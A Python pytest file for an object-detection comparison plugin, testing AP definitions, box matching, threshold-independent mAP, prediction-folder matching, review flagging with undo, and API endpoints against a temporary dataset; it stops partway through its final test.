"""Compare plugin: matching, AP definitions, threshold-independent mAP, folder matching, flags, storage, API.
Run: python -m pytest tests -q

Floats are compared with abs() rather than pytest.approx: approx probes numpy, which a background job of another
test may be importing at that moment."""
from __future__ import annotations

import json
import os
import random
import sys
import time
import unicodedata
import uuid
from pathlib import Path

import pytest
from PIL import Image

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
os.environ.setdefault("FOVEA_DATA_DIR", str(Path(__file__).resolve().parent / ".tmp-data"))

from fovea import db  # noqa: E402
from fovea.core import layout  # noqa: E402
from fovea.plugins.compare import analysis  # noqa: E402
from fovea.plugins.compare.evaluate import (IOU_GRID, FolderSource, PredFolder, ap_from_flags, average_precision,  # noqa: E402
                                            evaluate_image, iou_matrix, match_image, pack, parse_pred_text,
                                            parse_remap, pr_envelope, summarize, unpack, _greedy)


def close(a, b, tol=1e-4):
    return a is not None and b is not None and abs(a - b) <= tol


# ------------------------------------------------------------------ AP definitions

def test_ap_definitions_on_a_worked_example():
    # 4 ground-truth boxes, 5 predictions ranked by confidence: TP, FP, TP, FP, TP
    flags = [1, 0, 1, 0, 1]
    # all-point (VOC): recall steps of .25 at precision envelopes 1, 2/3, 3/5
    assert close(ap_from_flags(flags, 4, "voc"), 0.25 * 1 + 0.25 * (2 / 3) + 0.25 * 0.6)
    # COCO: mean of the envelope at recall 0, .01 ... 1 (101 points); recall 1.0 is never reached -> 0 there
    exp = (26 * 1 + 25 * (2 / 3) + 25 * 0.6 + 25 * 0) / 101
    assert close(ap_from_flags(flags, 4, "coco"), exp)
    assert ap_from_flags([], 3, "coco") == 0.0
    assert ap_from_flags([1], 0, "coco") is None                      # no ground truth: no AP, not 0%
    # the legacy helper keeps its all-point definition and its 0.0 for "nothing to rank"
    assert close(average_precision([(0.9, True), (0.8, False), (0.7, True)], 2), 0.8333, 1e-3)
    assert average_precision([], 3) == 0.0


def test_ultralytics_ap_matches_its_own_compute_ap():
    metrics = pytest.importorskip("ultralytics.utils.metrics")
    np = pytest.importorskip("numpy")
    rng = random.Random(7)
    for _ in range(30):
        n_gt = rng.randint(1, 12)
        flags = [1 if rng.random() < 0.55 else 0 for _ in range(rng.randint(1, 25))]
        flags = flags[:]
        tp = 0
        for i, f in enumerate(flags):           # never more TPs than ground truth
            if f and tp >= n_gt:
                flags[i] = 0
            tp += flags[i]
        tpc = np.cumsum(flags)
        rec = tpc / (n_gt + 1e-16)
        prec = tpc / np.arange(1, len(flags) + 1)
        ref = float(metrics.compute_ap(rec, prec)[0])
        assert close(ap_from_flags(flags, n_gt, "ultralytics"), ref, 1e-9)
    # the well-known 0.995 for a perfect class
    assert close(ap_from_flags([1, 1], 2, "ultralytics"), 0.995, 1e-9)


def test_pr_envelope_is_monotone_and_ends_at_reached_recall():
    env = pr_envelope([1, 0, 1, 0, 1], 4)
    assert len(env) == 101 and env[0] == 1.0 and env[100] == 0.0
    assert all(env[i] >= env[i + 1] for i in range(100))


# ------------------------------------------------------------------ matching

def test_legacy_match_image_contract():
    gt = [[0, .5, .5, .2, .2], [0, .2, .2, .1, .1]]
    preds = [[0, .5, .5, .21, .19, .9], [0, .8, .8, .1, .1, .6], [1, .2, .2, .1, .1, .7]]
    pred_tp, gt_matched = match_image(gt, preds, 0.5)
    assert pred_tp == [True, False, False] and gt_matched == [0, -1]


def test_greedy_matching_after_threshold_equals_matching_the_kept_predictions():
    """Matching once over all predictions and then keeping conf >= t gives exactly the TP set of matching only the
    kept predictions (greedy by confidence). This is what lets the UI move the threshold without re-running."""
    rng = random.Random(3)
    for _ in range(300):
        gt = [[rng.randint(0, 2), rng.uniform(.2, .8), rng.uniform(.2, .8), rng.uniform(.05, .3), rng.uniform(.05, .3)] for _ in range(rng.randint(0, 6))]
        preds = []
        for g in gt:
            for _ in range(rng.randint(0, 2)):
                preds.append([g[0] if rng.random() < .8 else rng.randint(0, 2), g[1] + rng.uniform(-.04, .04), g[2] + rng.uniform(-.04, .04),
                              g[3] * rng.uniform(.8, 1.2), g[4] * rng.uniform(.8, 1.2), round(rng.random(), 2)])
        preds += [[rng.randint(0, 2), rng.uniform(.1, .9), rng.uniform(.1, .9), .1, .1, round(rng.random(), 2)] for _ in range(rng.randint(0, 3))]
        r = evaluate_image(gt, preds, list(IOU_GRID), 0, "coco", 640, 640)
        for k in (0, 17, 25, 50, 73, 90):
            kept = [p for p in preds if p[5] >= k / 100 - 1e-9]
            tp_live = sum(match_image(gt, kept, 0.5)[0])
            tp_stored = sum(1 for p in range(len(r.cls)) if r.lvl[p] >= k and r.bits[p] & 1)
            assert tp_live == tp_stored
            fn_stored = sum(1 for lv in r.gt_lvl if lv < k)
            assert fn_stored == len(gt) - tp_live


def test_swap_runs_follow_the_threshold():
    # GT class 0; a confident class-1 box on it and a weak class-0 box on it
    gt = [[0, .5, .5, .2, .2]]
    preds = [[1, .5, .5, .2, .2, .9], [0, .5, .51, .2, .2, .3]]
    r = evaluate_image(gt, preds, list(IOU_GRID), 0, "coco", 640, 640)
    # thresholds 0.31..0.90: only the class-1 box is kept -> a class swap; at <= 0.30 the class-0 box takes the GT
    assert r.swaps == [(31, 90, 0, 1, 1)]


def test_ultralytics_matcher_lets_each_box_keep_the_highest_ranked_proposer():
    pcls, gcls = [0, 0], [0, 0]
    # det0 (higher conf) overlaps both boxes, best with box1; det1 only overlaps box1, also best with box1
    M = [[0.6, 0.9], [0.0, 0.95]]
    from fovea.plugins.compare.evaluate import _ultralytics
    assert _ultralytics(pcls, gcls, M, 0.5) == [1, -1]       # box1 keeps det0; det1 does not fall back
    assert _greedy(pcls, gcls, M, 0.5) == [1, -1]


def test_size_buckets_ignore_other_ranges_like_coco():
    gt = [[0, .5, .5, .5, .5], [0, .1, .1, .02, .02]]         # large (320 px) and small (13 px) at 640x640
    preds = [[0, .5, .5, .5, .5, .9], [0, .9, .9, .02, .02, .8]]
    r = evaluate_image(gt, preds, list(IOU_GRID), 0, "coco", 640, 640)
    S, M_, L = r.bucket
    # small: the big TP is ignored (matched an out-of-range box); the small FP counts; medium: nothing counts
    assert S == [-1, 0] and M_ == [-1, -1] and L == [1, -1]


def test_iou_matrix_is_symmetric_with_labels_iou():
    from fovea.core.labels import iou
    a = [[0, .3, .3, .2, .3]]
    b = [[1, .35, .32, .25, .2]]
    assert close(iou_matrix(a, b)[0][0], iou(a[0], b[0]), 1e-12)


# ------------------------------------------------------------------ threshold-independent mAP

def test_map_does_not_move_with_the_operating_threshold():
    rng = random.Random(11)
    from fovea.plugins.compare.evaluate import SideData, side_curves
    import array
    sd = SideData()
    g_cls, g_size = array.array("i"), array.array("b")
    for img in range(40):
        gt = [[rng.randint(0, 1), rng.uniform(.2, .8), rng.uniform(.2, .8), .1, .1] for _ in range(rng.randint(1, 4))]
        preds = [[g[0], g[1] + rng.uniform(-.02, .02), g[2], .1, .1, round(rng.random(), 3)] for g in gt if rng.random() < .8]
        preds += [[rng.randint(0, 1), rng.uniform(.1, .9), rng.uniform(.1, .9), .1, .1, round(rng.random(), 3)] for _ in range(2)]
        r = evaluate_image(gt, preds, list(IOU_GRID), 0, "coco", 640, 640)
        for g in gt:
            g_cls.append(g[0]); g_size.append(1)
        for p in range(len(r.cls)):
            sd.p_cls.append(r.cls[p]); sd.p_lvl.append(r.lvl[p]); sd.conf_d.append(r.conf[p]); sd.p_bits.append(r.bits[p])
            for b in range(3):
                sd.bucket[b].append(r.bucket[b][p])
    curves = side_curves(sd, g_cls, g_size, list(IOU_GRID), 0, "coco")
    maps = {summarize(curves, k)["map"] for k in (0, 25, 50, 90)}
    assert len(maps) == 1
    s0, s9 = summarize(curves, 0), summarize(curves, 90)
    assert s9["tp"] + s9["fp"] < s0["tp"] + s0["fp"] and s9["recall"] < s0["recall"]


# ------------------------------------------------------------------ prediction files and folders

def test_parse_pred_text_handles_boxes_polygons_pose_and_bom():
    rows = parse_pred_text("﻿0 .5 .5 .2 .2 .9\n1 .5 .5 .1 .1\n"
                           "2 0.1 0.1 0.3 0.1 0.2 0.3 0.77\n"          # segment polygon + conf
                           "3 .5 .5 .2 .4 .45 .4 2 .55 .6 1 .5 .7 0 0.66\n"  # pose (3 keypoints) + conf
                           "x bad line\n4 .5 .5 0 .1 .8\n")
    assert [r[0] for r in rows] == [0, 1, 2, 3]
    assert rows[0][5] == .9 and rows[1][5] is None
    assert close(rows[2][1], .2) and close(rows[2][3], .2) and rows[2][5] == .77
    assert close(rows[3][3], .2) and rows[3][5] == .66


def test_parse_remap():
    assert parse_remap("0:1, 1→0, 5:-") == {0: 1, 1: 0, 5: -1}
    assert parse_remap({"2": 3}) == {2: 3}
    with pytest.raises(ValueError):
        parse_remap("0 1")
    with pytest.raises(ValueError):
        parse_remap("a:b")


def _txt(path: Path, text="0 .5 .5 .2 .2 .9\n"):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)


def test_folder_matching_layouts_and_ambiguity(tmp_path):
    items = [{"id": 1, "rel_path": "train/dup.jpg", "split": "train"}, {"id": 2, "rel_path": "val/dup.jpg", "split": "val"},
             {"id": 3, "rel_path": "val/only.jpg", "split": "val"}]
    # split-mirrored: exact paths, never ambiguous
    m = tmp_path / "mirror"
    for r in ("train/dup", "val/dup", "val/only"):
        _txt(m / f"{r}.txt")
    src = FolderSource(m)
    src.prepare(items)
    assert src.how == ["path", "path", "path"] and src.matched[1] == "val/dup.txt"
    # flat folder: dup.txt cannot be attributed to train or val -> both skipped; only.txt is unique
    f = tmp_path / "flat"
    _txt(f / "dup.txt"); _txt(f / "only.txt")
    src = FolderSource(f)
    src.prepare(items)
    assert src.how[:2] == ["ambiguous", "ambiguous"] and src.matched[2] == "only.txt"
    # the split folder itself, evaluated alone: fine
    src = FolderSource(m / "val")
    src.prepare(items[1:])
    assert src.how == ["split", "split"]
    # ... but the same folder for every split claims val's file for train too -> ambiguous
    src.prepare(items)
    assert src.how[:2] == ["ambiguous", "ambiguous"]
    # an Ultralytics run folder with labels/<split>/...
    r = tmp_path / "run"
    _txt(r / "labels" / "val" / "only.txt")
    src = FolderSource(r)
    src.prepare(items)
    assert src.how[2] == "path" and src.how[0] == "none"


def test_folder_matching_is_unicode_normalization_proof(tmp_path):
    split_nfd = unicodedata.normalize("NFD", "test-포함")
    _txt(tmp_path / "p" / split_nfd / "a.txt")
    folder = PredFolder(tmp_path / "p")
    src = FolderSource(tmp_path / "p", folder=folder)
    src.prepare([{"id": 1, "rel_path": unicodedata.normalize("NFC", "test-포함/a.jpg"), "split": unicodedata.normalize("NFC", "test-포함")}])
    assert src.how == ["path"]


def test_pack_roundtrip():
    import array
    obj = {"a": array.array("I", [1, 2, 3]), "f": array.array("f", [0.5]), "s": ["x", "", "y/z"], "n": 3, "l": [array.array("b", [-1, 100])], "e": []}
    back = unpack(pack(obj))
    assert list(back["a"]) == [1, 2, 3] and back["s"] == ["x", "", "y/z"] and list(back["l"][0]) == [-1, 100] and back["e"] == []
    assert back["f"][0] == 0.5


def test_flag_note_lines_replace_their_own_line_only():
    note = analysis.with_line("checked by Kim", "abc", "Compare #abc: A 1 FN")
    assert note == "checked by Kim\nCompare #abc: A 1 FN"
    note = analysis.with_line(note, "abc", "Compare #abc: A 2 FN")
    assert note.count("Compare #abc") == 1 and note.endswith("A 2 FN")
    assert analysis.strip_line(note, "abc") == "checked by Kim"


# ------------------------------------------------------------------ API end to end

def _img(path: Path):
    path.parent.mkdir(parents=True, exist_ok=True)
    Image.new("RGB", (640, 480), (90, 90, 90)).save(path)


@pytest.fixture()
def world(tmp_path):
    """Dataset with 4 val images and 1 train image + two prediction folders, registered and scanned."""
    from fovea.core.scanner import scan_dataset
    from fovea.jobs import Job
    root = tmp_path / "ds"
    gt = {
        "val/a": "0 0.3 0.3 0.2 0.2\n1 0.7 0.7 0.2 0.2\n",
        "val/b": "0 0.5 0.5 0.3 0.3\n",
        "val/c": "1 0.5 0.5 0.2 0.4\n",
        "val/d": "",
        "train/e": "0 0.5 0.5 0.2 0.2\n",
    }
    for rel, text in gt.items():
        split, stem = rel.split("/")
        _img(root / "images" / split / f"{stem}.jpg")
        _txt(root / "labels" / split / f"{stem}.txt", text)
    pa = tmp_path / "predA"
    _txt(pa / "val" / "a.txt", "0 0.3 0.3 0.2 0.2 0.9\n1 0.7 0.7 0.2 0.2 0.4\n")            # 2 TP (one at 0.4)
    _txt(pa / "val" / "b.txt", "1 0.5 0.5 0.3 0.3 0.8\n")                                 # class swap 0 -> 1
    _txt(pa / "val" / "c.txt", "1 0.5 0.5 0.2 0.4 0.6\n0 0.1 0.9 0.1 0.1 0.3\n")          # TP + background FP
    _txt(pa / "val" / "d.txt", "0 0.5 0.5 0.1 0.1 0.2\n")                                 # FP on an empty image
    pb = tmp_path / "predB"
    _txt(pb / "val" / "a.txt", "0 0.3 0.3 0.2 0.2 0.7\n")
    _txt(pb / "val" / "c.txt", "1 0.5 0.5 0.2 0.4 0.95\n")
    db.init_db()
    lay = layout.detect(str(root))
    ds_id = "cmp-" + uuid.uuid4().hex[:8]
    now = db.now()
    db.execute("INSERT INTO datasets(id,name,root,layout,classes,classes_source,description,status,created_at,updated_at)"
               " VALUES(?,?,?,?,?,?,?,?,?,?)",
               (ds_id, ds_id, lay.root, db.dumps(lay.to_dict()), db.dumps(["person", "fall"]), "user", "", "new", now, now))
    scan_dataset(ds_id, Job(id="s", kind="scan"))
    yield {"ds": ds_id, "root": root, "a": pa, "b": pb, "tmp": tmp_path}
    db.execute("DELETE FROM plugin_data WHERE plugin='compare' AND dataset_id=?", (ds_id,))
    db.execute("DELETE FROM reviews WHERE dataset_id=?", (ds_id,))
    db.execute("DELETE FROM ai_preds WHERE dataset_id=?", (ds_id,))
    db.execute("DELETE FROM ai_runs WHERE dataset_id=?", (ds_id,))
    db.execute("DELETE FROM boxes WHERE dataset_id=?", (ds_id,))
    db.execute("DELETE FROM images WHERE dataset_id=?", (ds_id,))
    db.execute("DELETE FROM datasets WHERE id=?", (ds_id,))


def _client():
    from fastapi.testclient import TestClient
    from fovea.main import app
    return TestClient(app)


API = "/api/plugins/compare"


def _run(c, body):
    r = c.post(f"{API}/evaluate", json=body)
    assert r.status_code == 200, r.text
    job_id = r.json()["job"]["id"]
    for _ in range(400):
        j = c.get(f"/api/jobs/{job_id}").json()["job"]
        if j["status"] in ("done", "error", "cancelled"):
            assert j["status"] == "done", j
            return r.json()["eval_id"], j["result"]
        time.sleep(0.02)
    raise AssertionError("evaluation did not finish")


def test_api_evaluate_rows_confusion_and_viewer(world):
    c = _client()
    ds = world["ds"]
    eid, res = _run(c, {"dataset_id": ds, "a": {"type": "folder", "path": str(world["a"])}, "b": {"type": "folder", "path": str(world["b"])},
                        "split": "val", "iou": 0.5, "conf": 0.25, "metric": "coco"})
    assert res["saved"] and res["images"] == 4
    a = res["summary"]["a"]
    # GT: 4 boxes in val. At conf >= .25: A keeps a(0.9 TP, 0.4 TP), b(0.8 swap=FP), c(0.6 TP, 0.3 FP); d's 0.2 is out
    assert (a["gt"], a["tp"], a["fp"], a["fn"]) == (4, 3, 2, 1)
    b = res["summary"]["b"]
    assert (b["tp"], b["fp"], b["fn"]) == (2, 0, 2)
    # mAP uses all predictions: class 0 AP (3 GT... ) is the same at any threshold
    ev = c.get(f"{API}/evals/{eid}", params={"dataset_id": ds}).json()
    assert ev["eval"]["summary"]["a"]["map"] is not None and ev["curves"]["a"]["conf_available"]
    # rows at 0.5: a's 0.4 TP drops -> a has 1 FN; b (swap) and c (0.3 FP gone) ...
    rows = c.get(f"{API}/evals/{eid}/rows", params={"dataset_id": ds, "conf": 0.5, "show": "all", "sort": "name"}).json()
    by = {r["rel_path"]: r for r in rows["items"]}
    assert rows["total"] == 4
    assert by["val/a.jpg"]["a"] == {"tp": 1, "fp": 0, "fn": 1, "sw": 0}
    assert by["val/b.jpg"]["a"] == {"tp": 0, "fp": 1, "fn": 1, "sw": 1}
    assert by["val/c.jpg"]["a"]["fp"] == 0 and by["val/d.jpg"]["a"]["fp"] == 0
    # confusion matrix at 0.25: GT class 0 predicted as 1 once; background FPs of class 0 = c's 0.3 box
    cm = c.get(f"{API}/evals/{eid}/confusion", params={"dataset_id": ds, "conf": 0.25}).json()
    L, M = cm["labels"], cm["matrix"]
    assert L == [0, 1] and M[0][1] == 1 and M[0][0] == 1 and M[1][1] == 2 and M[2][0] == 1 and M[0][2] == 0
    cell = c.get(f"{API}/evals/{eid}/rows", params={"dataset_id": ds, "conf": 0.25, "show": "cell", "cell": "0:1"}).json()
    assert [r["rel_path"] for r in cell["items"]] == ["val/b.jpg"]
    # regression filter: B is worse than A where B misses what A found
    reg = c.get(f"{API}/evals/{eid}/rows", params={"dataset_id": ds, "conf": 0.25, "show": "regress"}).json()
    assert {r["rel_path"] for r in reg["items"]} == {"val/b.jpg"} or reg["total"] >= 1
    # live viewer detail agrees with the stored counts; editing the labels marks it as changed
    iid = by["val/b.jpg"]["id"]
    det = c.get(f"{API}/evals/{eid}/image/{iid}", params={"dataset_id": ds, "conf": 0.25}).json()["detail"]
    assert det["sides"]["a"]["counts"]["sw"] == 1 and not det["sides"]["a"]["changed"]
    assert det["sides"]["a"]["preds"][0]["swap_gt"] == 0 and det["sides"]["a"]["gt_state"] == ["swap"]
    db.execute("UPDATE boxes SET cls=1 WHERE image_id=?", (iid,))
    det = c.get(f"{API}/evals/{eid}/image/{iid}", params={"dataset_id": ds, "conf": 0.25}).json()["detail"]
    assert det["sides"]["a"]["changed"] and det["sides"]["a"]["counts"]["tp"] == 1
    # CSV export carries the same numbers
    csv_text = c.get(f"{API}/evals/{eid}/export", params={"dataset_id": ds, "what": "images", "conf": 0.5, "show": "all", "sort": "name"}).text
    assert "val/b.jpg" in csv_text and csv_text.lstrip("﻿").startswith("image_id,rel_path")
    classes_csv = c.get(f"{API}/evals/{eid}/export", params={"dataset_id": ds, "what": "classes"}).text
    assert "person" in classes_csv and "a_best_conf" in classes_csv
    # listing reads metadata only; rename and delete
    lst = c.get(f"{API}/evals", params={"dataset_id": ds}).json()["evals"]
    assert [e["id"] for e in lst] == [eid] and "rows" not in lst[0]
    assert c.patch(f"{API}/evals/{eid}", params={"dataset_id": ds}, json={"name": "renamed"}).json()["eval"]["name"] == "renamed"
    assert c.delete(f"{API}/evals/{eid}", params={"dataset_id": ds}).status_code == 200
    assert db.query_one("SELECT COUNT(*) n FROM plugin_data WHERE plugin='compare' AND dataset_id=?", (ds,))["n"] == 0


def test_api_flags_respect_reviews_and_undo(world):
    c = _client()
    ds = world["ds"]
    eid, _ = _run(c, {"dataset_id": ds, "a": {"type": "folder", "path": str(world["a"])}, "split": "val"})
    db.execute("INSERT INTO reviews(dataset_id, rel_path, status, note, updated_at) VALUES(?,?,?,?,?)", (ds, "val/b.jpg", "excluded", "", db.now()))
    db.execute("INSERT INTO reviews(dataset_id, rel_path, status, note, updated_at) VALUES(?,?,?,?,?)", (ds, "val/c.jpg", "approved", "", db.now()))
    db.execute("INSERT INTO reviews(dataset_id, rel_path, status, note, updated_at) VALUES(?,?,?,?,?)", (ds, "val/d.jpg", "flagged", "blurry", db.now()))
    body = {"dataset_id": ds, "conf": 0.1, "criteria": {"side": "a", "fn": True, "fp": True}}
    dry = c.post(f"{API}/evals/{eid}/flag", json={**body, "dry_run": True}).json()
    # errors at 0.1: a (none: both TP), b (swap), c (FP 0.3), d (FP 0.2) -> 3 images
    assert dry["images"] == 3 and dry["will_flag"] == 0 and dry["will_update"] == 1 and dry["statuses"] == {"excluded": 1, "approved": 1, "flagged": 1}
    res = c.post(f"{API}/evals/{eid}/flag", json=body).json()
    assert res["skipped_excluded"] == 1 and res["skipped_approved"] == 1 and res["updated"] == 1 and res["flagged"] == 0
    note = db.query_one("SELECT note FROM reviews WHERE dataset_id=? AND rel_path='val/d.jpg'", (ds,))["note"]
    assert note.startswith("blurry\nCompare #") and "A 1 FP" in note
    # single image flag (viewer F) on an unreviewed image, then undo it
    iid = db.query_one("SELECT id FROM images WHERE dataset_id=? AND rel_path='val/a.jpg'", (ds,))["id"]
    c.post(f"{API}/evals/{eid}/flag", json={"dataset_id": ds, "image_ids": [iid], "conf": 0.5})
    assert db.query_one("SELECT status FROM reviews WHERE dataset_id=? AND rel_path='val/a.jpg'", (ds,))["status"] == "flagged"
    assert c.get(f"{API}/evals/{eid}/flags", params={"dataset_id": ds}).json()["count"] == 2
    out = c.post(f"{API}/evals/{eid}/unflag", json={"dataset_id": ds, "all": True}).json()
    assert out["restored"] == 2
    assert db.query_one("SELECT status FROM reviews WHERE dataset_id=? AND rel_path='val/a.jpg'", (ds,)) is None
    d = db.query_one("SELECT status, note FROM reviews WHERE dataset_id=? AND rel_path='val/d.jpg'", (ds,))
    assert d["status"] == "flagged" and d["note"] == "blurry"
    # a mark changed by a person after flagging is left alone on undo
    c.post(f"{API}/evals/{eid}/flag", json={"dataset_id": ds, "image_ids": [iid]})
    db.execute("UPDATE reviews SET status='approved' WHERE dataset_id=? AND rel_path='val/a.jpg'", (ds,))
    out = c.post(f"{API}/evals/{eid}/unflag", json={"dataset_id": ds, "image_ids": [iid]}).json()
    assert out == {"restored": 0, "changed": 1, "remaining": 0}


def test_api_validation_coverage_and_refusals(world):
    c = _client()
    ds = world["ds"]
    base = {"dataset_id": ds, "a": {"type": "folder", "path": str(world["a"])}, "split": "val"}
    for bad in ({"iou": 0}, {"iou": 1.2}, {"conf": 1}, {"conf": -0.5}, {"metric": "nope"}, {"a": {"type": "folder", "path": str(world["tmp"] / "missing")}},
                {"a": {"type": "run", "run_id": 9999}}, {"a": {"type": "folder", "path": str(world["a"]), "remap": "0-1"}}):
        assert c.post(f"{API}/evaluate", json={**base, **bad}).status_code in (400, 404), bad
    # a folder that matches nothing in scope is refused, not saved as a page of 0%
    eid, res = _run(c, {**base, "split": "train"})
    assert res["saved"] is False and "no prediction file" in res["reason"]
    assert c.get(f"{API}/evals", params={"dataset_id": ds}).json()["evals"] == []
    chk = c.post(f"{API}/check", json={"dataset_id": ds, "source": {"type": "folder", "path": str(world["a"] / "val")}, "split": "train"}).json()["coverage"]
    assert chk["matched"] == 0 and any(h["kind"] == "split" and h["splits"] == ["val"] for h in chk["hints"])
    chk = c.post(f"{API}/check", json={"dataset_id": ds, "source": {"type": "folder", "path": str(world["a"])}, "split": ""}).json()["coverage"]
    assert chk["matched"] == 4 and chk["images"] == 5 and chk["has_conf"]
    # missing files: 'skip' leaves those images out instead of counting their boxes as misses
    eid, res = _run(c, {**base, "a": {"type": "folder", "path": str(world["b"]), "missing": "skip"}})
    assert res["images"] == 2


def test_api_ai_run_source_and_legacy_migration(world):
    c = _client()
    ds = world["ds"]
    now = db.now()
    ids = {r["rel_path"]: r["id"] for r in db.query("SELECT id, rel_path FROM images WHERE dataset_id=?", (ds,))}
    rid = db.execute("INSERT INTO ai_runs(dataset_id, kind, provider, model, params, status, images, created_at) VALUES(?,?,?,?,?,?,?,?)",
                     (ds, "batch", "mock", "m1", json.dumps({"image_ids": [ids["val/a.jpg"], ids["val/b.jpg"]]}), "done", 2, now)).lastrowid
    db.executemany("INSERT INTO ai_preds(run_id,dataset_id,image_id,cls,xc,yc,w,h,conf,kind,state,created_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)",
                   [(rid, ds, ids["val/a.jpg"], 0, .3, .3, .2, .2, .8, "detect", "pending", now),
                    (rid, ds, ids["val/a.jpg"], 1, .7, .7, .2, .2, .7, "detect", "accepted", now),
                    (rid, ds, ids["val/a.jpg"], 0, .3, .3, .2, .2, None, "missing", "pending", now)])     # audit kind: not a prediction
    runs = c.get(f"{API}/runs", params={"dataset_id": ds}).json()["runs"]
    assert [r["id"] for r in runs] == [rid] and runs[0]["preds"] == 2 and runs[0]["processed_known"] and runs[0]["accepted"] == 1
    eid, res = _run(c, {"dataset_id": ds, "a": {"type": "run", "run_id": rid}, "split": ""})
    # processed images a (2 TP) and b (no predictions -> 1 FN); the other images are out of the run's scope
    assert res["images"] == 2 and (res["summary"]["a"]["tp"], res["summary"]["a"]["fn"]) == (2, 1)
    meta = c.get(f"{API}/evals/{eid}", params={"dataset_id": ds}).json()["eval"]
    assert any("accepted into the labels" in w["text"] for w in meta["warnings"])
    # a Compare 1.x record (rows inline) is split on first listing and still opens
    legacy = {"id": "old1", "name": "old", "dataset_id": ds, "pred_a": str(world["a"]), "pred_b": None, "pred_a_host": str(world["a"]), "pred_b_host": None,
              "iou": 0.5, "conf": 0.25, "filters": {"split": "val"}, "created_at": now - 10, "images": 1, "pred_files": {"a": 1, "b": 0},
              "summary": {"a": {"classes": [], "overall": {"map50": 0.5, "precision": 1, "recall": 1, "f1": 1, "tp": 1, "fp": 0, "fn": 0, "gt": 1}}, "b": None},
              "rows": [{"id": ids["val/a.jpg"], "rel_path": "val/a.jpg", "split": "val", "gt": 2, "a": {"tp": 1, "fp": 0, "fn": 1}}]}
    db.execute("INSERT INTO plugin_data(plugin, dataset_id, key, value, updated_at) VALUES('compare',?,?,?,?)", (ds, "old1", json.dumps(legacy), now - 10))
    lst = c.get(f"{API}/evals", params={"dataset_id": ds}).json()["evals"]
    old = [e for e in lst if e["id"] == "old1"][0]
    assert old["legacy"] and old["scope"]["split"] == ["val"]
    stored = json.loads(db.query_one("SELECT value FROM plugin_data WHERE plugin='compare' AND dataset_id=? AND key='old1'", (ds,))["value"])
    assert "rows" not in stored and db.query_one("SELECT 1 FROM plugin_data WHERE plugin='compare' AND dataset_id=? AND key='old1/legacy'", (ds,))
    rows = c.get(f"{API}/evals/old1/rows", params={"dataset_id": ds}).json()
    assert rows["total"] == 1 and rows["legacy"]
    det = c.get(f"{API}/evals/old1/image/{ids['val/a.jpg']}", params={"dataset_id": ds}).json()["detail"]
    assert det["sides"]["a"]["counts"]["tp"] == 2
    assert c.post(f"{API}/evals/old1/flag", json={"dataset_id": ds, "dry_run": True}).status_code == 409


def test_discover_offers_parent_folders_and_skips_non_yolo_text(world):
    c = _client()
    ds = world["ds"]
    (world["tmp"] / "notes.txt").write_text("Seed: 32\nsome notes\n")
    _txt(world["a"] / "test" / "z.txt")                                # predA now has two split folders
    d = c.get(f"{API}/discover", params={"path": str(world["tmp"]), "dataset_id": ds}).json()["dirs"]
    rels = {e["rel"]: e for e in d}
    assert "" not in rels                                             # the notes.txt folder is not a prediction folder
    assert rels["predA"]["kind"] == "parent" and rels["predA"]["has_conf"]
    assert rels["ds/labels/val"]["is_gt"] and not rels["ds/labels/val"]["has_conf"]
    assert d[0]["has_conf"] and not d[-1]["has_conf"]


def test_api_run_a_model_records_an_evaluable_run(world, monkeypatch):
    c = _client()
    ds = world["ds"]
    r = c.post(f"{API}/runs/start", json={"dataset_id": ds, "provider": "anthropic", "model": "claude-sonnet-5-5", "split": "val"})
    assert r.status_code == 400 and "AI tab" in r.json()["detail"]                 # cloud models: cost UX lives there
    monkeypatch.setenv("FOVEA_AI_MOCK", "1")
    from fovea.ai import registry
    monkeypatch.setattr(registry, "is_cloud", lambda pid: False)                   # treat the mock as a local model
    dry = c.post(f"{API}/runs/start", json={"dataset_id": ds, "provider": "mock", "split": "val", "dry_run": True})
    assert dry.status_code == 200, dry.text
    assert dry.json()["images"] == 4
    r = c.post(f"{API}/runs/start", json={"dataset_id": ds, "provider": "mock", "split": "val", "conf": 0.01})
    assert r.status_code == 200, r.text
    run_id, job_id = r.json()["run_id"], r.json()["job"]["id"]
    for _ in range(500):
        j = c.get(f"/api/jobs/{job_id}").json()["job"]
        if j["status"] in ("done", "error", "cancelled"):
            break
        time.sleep(0.02)
    assert j["status"] == "done", j
    run = db.query_one("SELECT kind, status, images, result FROM ai_runs WHERE id=?", (run_id,))
    res = json.loads(run["result"])
    assert run["kind"] == "benchmark" and run["status"] == "done" and run["images"] == 4
    val_ids = sorted(r["id"] for r in db.query("SELECT id FROM images WHERE dataset_id=? AND split='val'", (ds,)))
    covered = {i for a, b in res["image_ranges"] for i in range(a, b + 1)}
    assert covered == set(val_ids) and res["source"] == "compare" and "precision" in res
    states = {r["state"] for r in db.query("SELECT DISTINCT state FROM ai_preds WHERE run_id=?", (run_id,))}
    assert states <= {"info"}                                                       # never shown as proposals
    runs = c.get(f"{API}/runs", params={"dataset_id": ds}).json()["runs"]
    if states:
        mine = [x for x in runs if x["id"] == run_id][0]
        assert mine["processed_known"] and mine["processed"] == 4
        eid, out = _run(c, {"dataset_id": ds, "a": {"type": "run", "run_id": run_id}, "split": ""})
        assert out["saved"] and out["images"] == 4                                  # every processed image, even with no boxes


def test_api_flag_exactly_what_the_table_shows(world):
    c = _client()
    ds = world["ds"]
    eid, _ = _run(c, {"dataset_id": ds, "a": {"type": "folder", "path": str(world["a"])}, "split": "val"})
    body = {"dataset_id": ds, "conf": 0.25, "table": {"show": "cell", "cell": "0:1", "side": "a"}}
    dry = c.post(f"{API}/evals/{eid}/flag", json={**body, "dry_run": True}).json()
    assert dry["images"] == 1 and dry["will_flag"] == 1
    res = c.post(f"{API}/evals/{eid}/flag", json=body).json()
    assert res["flagged"] == 1
    row = db.query_one("SELECT status, note FROM reviews WHERE dataset_id=? AND rel_path='val/b.jpg'", (ds,))
    assert row["status"] == "flagged" and "1 swapped" in row["note"]
    fp_only = c.post(f"{API}/evals/{eid}/flag", json={"dataset_id": ds, "conf": 0.25, "table": {"show": "fp", "side": "a"}, "dry_run": True}).json()
    assert fp_only["images"] == 2                       # b (the swap is also a false positive) and c (background box)



def test_api_undo_of_one_flag_operation_keeps_earlier_flags(world):
    c = _client()
    ds = world["ds"]
    eid, _ = _run(c, {"dataset_id": ds, "a": {"type": "folder", "path": str(world["a"])}, "split": "val"})
    iid = db.query_one("SELECT id FROM images WHERE dataset_id=? AND rel_path='val/b.jpg'", (ds,))["id"]
